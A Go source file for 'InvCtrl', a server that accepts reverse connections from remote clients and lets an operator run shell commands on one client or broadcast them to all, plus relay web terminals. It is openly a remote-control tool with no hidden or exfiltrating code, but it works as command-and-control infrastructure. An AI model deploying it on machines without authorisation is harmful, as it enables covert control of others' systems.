package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/rpc"
	"os"
	"strconv"
	"strings"
	"time"

	"modernc.org/httpfs"
	//"github.com/davecgh/go-spew/spew"
	"github.com/fatih/pool"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/invctrl/hijack/header"
	"github.com/invctrl/hijack/protocol"
	"github.com/invctrl/hijack/wrap"
	"github.com/navigaid/gods/maps/linkedhashmap"
	"github.com/navigaid/gotty/assets"
	"github.com/navigaid/gotty/utils"
	"github.com/navigaid/gotty/wetty"
	"github.com/navigaid/pretty"
	"gopkg.in/readline.v1"
)

type Client struct {
	UUID       uuid.UUID
	LocalAddr  net.Addr
	RemoteAddr net.Addr
	RPC        *rpc.Client
	Info       string
	Conns      map[string]net.Conn
	WsConns    map[string]*websocket.Conn
	Pool       pool.Pool
}

type Pool struct {
	Clients *linkedhashmap.Map
	Current *Client
	Latest  *Client
}

func NewPool() *Pool {
	return &Pool{
		Clients: linkedhashmap.New(),
	}
}

var ClientPool = NewPool()

func (p *Pool) Del(uuid string) {
	p.Clients.Remove(uuid)
	if (p.Current != nil) && (p.Current.UUID.String() == uuid) {
		p.Current = nil //new(Client)
	}
}

func (p *Pool) Get(uuid string) *Client {
	v, _ := p.Clients.Get(uuid)
	return v.(*Client)
}

func (p *Pool) Add(client *Client) {
	p.Clients.Put(client.UUID.String(), client)
	p.Latest = client
}

func (p *Pool) Dump() {
	log.Println("[client pool]")
	isCurrent := func(uuid string) string {
		if (p.Current != nil) && (p.Current.UUID.String() == uuid) {
			return "*"
		}
		return " "
	}
	for i, v := range p.Clients.Values() {
		client := v.(*Client)
		uuid := p.Clients.Keys()[i].(string)
		fmt.Println(
			fmt.Sprintf("[%s]", strconv.Itoa(i+1)),
			isCurrent(uuid),
			uuid,
			"ssh ubuntu@"+strings.Split(client.RemoteAddr.String(), ":")[0],
			client.Info,
		)
	}
}

func (p *Pool) Has(uuid string) bool {
	_, found := p.Clients.Get(uuid)
	return found
}

func NewClient(w http.ResponseWriter) (*Client, error) {
	client := new(Client) // using named return causes panic, why?
	client.UUID = uuid.New()
	client.WsConns = make(map[string]*websocket.Conn)
	client.Conns = make(map[string]net.Conn)

	conn, err := wrap.WrapConn(w.(http.Hijacker).Hijack())
	if err != nil {
		return nil, err
	}

	client.RemoteAddr = conn.RemoteAddr()
	client.LocalAddr = conn.LocalAddr()

	sheader := &header.Header{}
	cheader := &header.ClientHeader{}
	// here we don't cate about decoder.Buffered
	// we can pretty much assume it is empty cuz after the client send it's header
	// to server, it will wait server's confirmation, during this period nothing will
	// be sent from the client. so once the server receives the complete header, nothing
	// is left in the buffer
	// similarly hibuf is useless after this...
	if err := json.NewDecoder(conn).Decode(&sheader); err != nil {
		cheader.Status = "NO"
		cheader.Err = err.Error()
		conn.Write([]byte(pretty.JsonString(cheader)))
		return nil, err
	}

	cheader.Status = "OK"

	if sheader.Append {
		conn.Write([]byte(pretty.JsonString(cheader)))
		client := ClientPool.Get(sheader.Id)
		client.Conns[sheader.Nonce] = conn
		log.Println(client.UUID, "conns:", client.Conns)
		return nil, fmt.Errorf("append to %s", sheader.Id)
	}

	cheader.Id = client.UUID.String()
	conn.Write([]byte(pretty.JsonString(cheader)))
	client.Info = pretty.JSONString(sheader)

	client.RPC = NewRPCClient(conn, onclose(client))

	log.Println("connected:", client.UUID, client.RemoteAddr)

	ClientPool.Add(client)
	ClientPool.Get(client.UUID.String())
	factory := func() (net.Conn, error) {
		nonce := uuid.New().String()
		id := client.UUID.String()
		req := protocol.ConnRequest{
			Id:    id,
			Nonce: nonce,
		}
		resp := new(protocol.ConnResponse)
		done := make(chan *rpc.Call, 1)
		client.RPC.Go("Conn.New", req, resp, done)
		<-done
		conn, ok := client.Conns[nonce]
		if !ok {
			return nil, fmt.Errorf("client nonce doesn't exist: %s", nonce)
		}
		delete(client.Conns, nonce)
		return conn, nil
	}
	client.Pool, err = pool.NewChannelPool(5, 30, factory)
	if err != nil {
		return nil, err
	}

	ClientPool.Dump()
	return client, nil
}

// rpc call to initiate a ws conn to /ws from client
func wsfactory(client *Client) (*websocket.Conn, error) {
	nonce := uuid.New().String()
	id := client.UUID.String()

	req := protocol.WsConnRequest{
		Id:    id,
		Nonce: nonce,
	}
	resp := new(protocol.WsConnResponse)

	done := make(chan *rpc.Call, 1)
	client.RPC.Go("WsConn.New", req, resp, done)
	<-done

	time.Sleep(time.Second / 3) // todo: investigate why it is necessary
	conn, ok := client.WsConns[nonce]
	if !ok {
		return nil, fmt.Errorf("client nonce doesn't exist: %s", nonce)
	}
	delete(client.WsConns, nonce)
	return conn, nil
}

func newClientHeader(status string, id string) *clientHeader {
	return &clientHeader{
		Status: status,
		Id:     id,
	}
}

type clientHeader struct {
	Status string `json:"status"`
	Id     string `json:"id"`
	Err    string `json:"error,omitempty"`
}

// onclose is called when client goes offline
// client.UUID, client.RemoteAddr, client.Info
func onclose(client *Client) func() {
	return func() {
		ClientPool.Dump()
		log.Println("disconnected:", client.UUID, client.RemoteAddr, client.Info)
		ClientPool.Del(client.UUID.String())
	}
}

// we use NewRPCClient over rpc.NewClient(conn)
// so we can remove client from pool immediately when it is disconnected

/*
          / io.Reader >--->copy()---> io.PipeWriter ===> io.PipeReader = intercepted io.Reader \
net.Conn  - io.Writer \                                                                        wrap.ReadWriteCloser() - rpc.NewClient - *rpc.Client
          \ io.Closer - io.WriteCloser ---------------------------------------------------------
*/
func NewRPCClient(conn io.ReadWriteCloser, onclose func()) *rpc.Client {
	copy := func(dst io.Writer, src io.Reader) {
		if _, err := io.Copy(dst, src); err != nil {
			log.Println(err)
		}
		onclose()
	}
	pr, pw := io.Pipe()
	go copy(pw, conn)
	return rpc.NewClient(wrap.WrapReadWriteCloser(pr, conn))
}

func hijacker(w http.ResponseWriter, r *http.Request) {
	_, err := NewClient(w)
	if err != nil {
		log.Println(err)
		return
	}
}

func input() {
	for {
		rl, err := readline.NewEx(&readline.Config{
			HistoryFile:         "/tmp/readline.tmp",
			ForceUseInteractive: true,
			// InterruptPrompt:     "exit?",
		})
		if err != nil {
			panic(err)
		}
		defer rl.Close()
		fmt.Println("Welcome to InvCtrl!!!")
		promptNum := 1
	INNER:
		for {
			rl.SetPrompt(fmt.Sprintf("In[%d]:= ", promptNum))
			line, err := rl.Readline()
			switch err {
			case nil: // NOP
			case io.EOF:
				fmt.Println("bye")
				break INNER
			case readline.ErrInterrupt:
				fmt.Println("try Exit, or Quit")
			default:
				fmt.Println(err)
			}

			bash := func(line string, client *Client) {
				req := protocol.Request{
					Command: line,
				}
				resp := new(protocol.Response)
				err := client.RPC.Call("Bash.Execute", req, resp)
				if err != nil {
					log.Println(resp.Message, err)
					return
				}
				log.Println("rpc message received:\n\n", resp.Message)
			}
			switch {
			case strings.HasPrefix(line, "!map "):
				line = strings.TrimPrefix(line, "!map ")
				for _, v := range ClientPool.Clients.Values() {
					client := v.(*Client)
					//client.Conn.Write([]byte(line + "\n"))
					go bash(line, client)
				}
				continue
			case line == "":
				continue
			case line == "Exit", line == "Quit":
				os.Exit(0)
			case line == "Ls":
				ClientPool.Dump()
				continue
			case ClientPool.Has(line):
				ClientPool.Current = ClientPool.Get(line)
				log.Println("current client:", ClientPool.Current.UUID)
				continue
			default:
				if ClientPool.Current == nil {
					fmt.Println("[INFO] Your current client is empty. Enter the uuid to the client you want to talk to first:")
					continue
				}
			}

			if line == "N" {
				client := ClientPool.Current
				conn, err := client.Pool.Get()
				log.Println("[POOL Size]", client.Pool.Len())
				if err == nil {
					go io.Copy(os.Stderr, conn)
				} else {
					log.Println(err)
				}
			} else {
				go bash(line, ClientPool.Current)
			}

			promptNum += 1
		}

		log.Println("stdin input closed")
	}
}

// wslisten assumes r.RequestURI == "/ws" {
// the request is initiated by slaves at wsfactory's command
func wslisten(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", 405)
		return
	}

	conn, err := wetty.Upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
		return
	}
	// don't do this!!!
	// defer conn.Close()
	// you should leave the conn open until the matching frontend conn is closed

	var this io.ReadWriter = &utils.WsWrapper{conn}

	buf := make([]byte, 1024)
	n, err := this.Read(buf)
	if err != nil {
		log.Println(err)
	}
	id := string(buf[:n])
	client := ClientPool.Get(id)

	n, err = this.Read(buf)
	if err != nil {
		log.Println(err)
	}
	nonce := string(buf[:n])

	client.WsConns[nonce] = conn
}

// listen on frontend ws connection
func wsrelay(w http.ResponseWriter, r *http.Request, client *Client) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", 405)
		return
	}

	conn, err := wetty.Upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
		return
	}
	defer conn.Close()

	connRemote, err := wsfactory(client)
	if err != nil {
		log.Println(err)
		return
	}

	var (
		this io.ReadWriter = &utils.WsWrapper{conn}
		that io.ReadWriter = &utils.WsWrapper{connRemote}
		errs               = make(chan error, 2)
	)

	go func() {
		errs <- func() error {
			_, err := io.Copy(that, this)
			log.Println(err)
			return err
		}()
	}()

	go func() {
		errs <- func() error {
			_, err := io.Copy(this, that)
			log.Println(err)
			return err
		}()
	}()

	log.Println(<-errs)

	return
}

func frontend(w http.ResponseWriter, r *http.Request) {
	uri := strings.Split(strings.TrimPrefix(r.RequestURI, "/ws/"), "/")[0]

	if ClientPool.Has(uri) {
		client := ClientPool.Get(uri)
		// handle non-ws static resources
		if !strings.HasSuffix(r.RequestURI, "/ws") {
			staticFileServer := http.FileServer(httpfs.NewFileSystem(assets.Assets, time.Now()))
			http.StripPrefix("/ws/"+uri+"/", staticFileServer).ServeHTTP(w, r)
			return
		}
		// relayfrontend ws connection
		wsrelay(w, r, client)
		return
	}
	http.Redirect(w, r, "/", 302)
}

func ls(w http.ResponseWriter, r *http.Request) {
	isCurrent := func(uuid string) string {
		if (ClientPool.Current != nil) && (ClientPool.Current.UUID.String() == uuid) {
			return "*"
		}
		return " "
	}

	w.Header().Add("Content-Type", "text/html; charset=UTF-8")
	uri := strings.TrimPrefix(r.RequestURI, "/")
	if ClientPool.Has(uri) {
		log.Println(uri)
		client := ClientPool.Get(uri)
		href := fmt.Sprintf(`<a href="/ws/%s/">%s</a>`, uri, uri)
		fmt.Fprintln(w, href)
		fmt.Fprintln(w, "<pre>")
		fmt.Fprintln(w,
			fmt.Sprintf("[%s]", "N/A"),
			isCurrent(uri),
			uri,
			"ssh ubuntu@"+strings.Split(client.RemoteAddr.String(), ":")[0],
			client.Info,
		)
		fmt.Fprintln(w, "</pre>")
		return
	}
	for i, v := range ClientPool.Clients.Values() {
		client := v.(*Client)
		uuid := ClientPool.Clients.Keys()[i].(string)
		href := fmt.Sprintf(`<a href="%s">%s</a>`, uuid, uuid)
		wshref := fmt.Sprintf(`<a href="/ws/%s/">ws</a>`, uuid)
		fmt.Fprintln(w,
			fmt.Sprintf("[%s]", strconv.Itoa(i+1)),
			isCurrent(uuid),
			href,
			wshref,
			"ssh ubuntu@"+strings.Split(client.RemoteAddr.String(), ":")[0],
		)
		fmt.Fprintln(w, "<pre>")
		fmt.Fprintln(w,
			client.Info,
		)
		fmt.Fprintln(w, "</pre>")
	}
}

func hijack(original http.Handler) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get(http.CanonicalHeaderKey("Hijack")) == "true" {
			hijacker(w, r)
			return
		}
		original.ServeHTTP(w, r)
	}
}

func main() {
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)

	mux := http.NewServeMux()
	mux.HandleFunc("/", ls)
	mux.HandleFunc("/ws", wslisten)
	mux.HandleFunc("/ws/", frontend)
	go input()
	if len(os.Args) > 1 {
		log.Println("listening on http://localhost" + os.Args[1])
		log.Fatalln(http.ListenAndServe(os.Args[1], hijack(mux)))
	}
	log.Println("listening on http://localhost:8000")
	log.Fatalln(http.ListenAndServe(":8000", hijack(mux)))
}
